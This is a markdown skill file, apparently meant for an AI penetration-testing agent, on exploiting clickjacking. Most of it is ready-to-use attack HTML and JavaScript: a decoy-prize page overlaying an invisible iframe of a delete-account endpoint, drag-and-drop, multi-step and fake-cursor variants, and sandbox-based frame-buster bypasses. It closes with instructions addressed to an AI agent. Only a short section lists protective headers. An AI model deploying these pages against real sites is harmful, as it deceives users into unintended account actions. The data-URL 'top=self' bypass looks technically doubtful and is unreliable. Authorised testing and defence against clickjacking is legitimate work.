# Clickjacking Skill

## Goal

Identify and exploit clickjacking (UI redressing) vulnerabilities to trick users into performing unintended actions.

## Methodology

1. **Check Frame Protection:** Examine X-Frame-Options and CSP frame-ancestors headers
2. **Test Framing:** Attempt to load target page in an iframe
3. **Create Overlay Attack:** Design deceptive UI that overlays the target
4. **Position Interactive Elements:** Align victim's click with hidden action
5. **Deliver Payload:** Host attack page and lure victim

## Basic Clickjacking PoC

```html
<!DOCTYPE html>
<html>
<head>
  <title>Click Here to Win!</title>
  <style>
    #target-frame {
      position: absolute;
      top: 0;
      left: 0;
      width: 500px;
      height: 400px;
      opacity: 0.0001;  /* Nearly invisible */
      z-index: 2;
    }
    #decoy {
      position: absolute;
      top: 100px;
      left: 100px;
      z-index: 1;
    }
  </style>
</head>
<body>
  <button id="decoy">Click to Win a Prize!</button>
  <iframe id="target-frame" src="https://target.com/delete-account"></iframe>
</body>
</html>
```

## Advanced Techniques

### Drag-and-Drop Clickjacking
```html
<!-- Trick user into dragging sensitive data -->
<div id="drag" draggable="true" ondragstart="event.dataTransfer.setData('text','malicious')">
  Drag this to win!
</div>
<iframe id="target" src="https://target.com/upload"></iframe>
```

### Multi-Step Clickjacking
```javascript
// Move iframe after each click
let step = 0;
document.onclick = function() {
  step++;
  if (step === 1) {
    document.getElementById('frame').style.top = '200px';
  } else if (step === 2) {
    document.getElementById('frame').style.top = '300px';
  }
};
```

### Cursor Manipulation
```html
<style>
body { cursor: none; }
#fake-cursor {
  position: fixed;
  width: 20px;
  height: 20px;
  background: url('cursor.png');
  pointer-events: none;
  z-index: 9999;
}
</style>
<script>
document.onmousemove = function(e) {
  // Offset the fake cursor from real position
  document.getElementById('fake-cursor').style.left = (e.clientX - 100) + 'px';
  document.getElementById('fake-cursor').style.top = (e.clientY - 100) + 'px';
};
</script>
```

## Detection Test

```html
<!-- Check if site can be framed -->
<iframe src="https://target.com" onload="alert('Frameable!')" onerror="alert('Protected')"></iframe>
```

## Bypass Techniques

```html
<!-- Sandbox attribute to bypass frame-busting scripts -->
<iframe sandbox="allow-forms allow-scripts" src="https://target.com"></iframe>

<!-- For sites that check top === self -->
<iframe src="data:text/html,<script>top=self</script><iframe src='https://target.com'></iframe>"></iframe>
```

## Protection Headers

```
X-Frame-Options: DENY
X-Frame-Options: SAMEORIGIN
Content-Security-Policy: frame-ancestors 'none';
Content-Security-Policy: frame-ancestors 'self';
```

## Tools

* **Burp Suite Clickbandit** - Automated clickjacking PoC generator
* **Browser DevTools** - Check response headers
* **Online frame testers**

## Guidance for AI

* Activate when testing sites without proper frame protection headers
* Check both X-Frame-Options and CSP frame-ancestors
* Sandbox attribute can bypass JavaScript-based frame busters
* Consider multi-click attacks for multi-step processes
* Drag-and-drop clickjacking can bypass some protections
* Most modern sites are protected; focus on legacy applications
* Mobile apps may have different framing behaviors
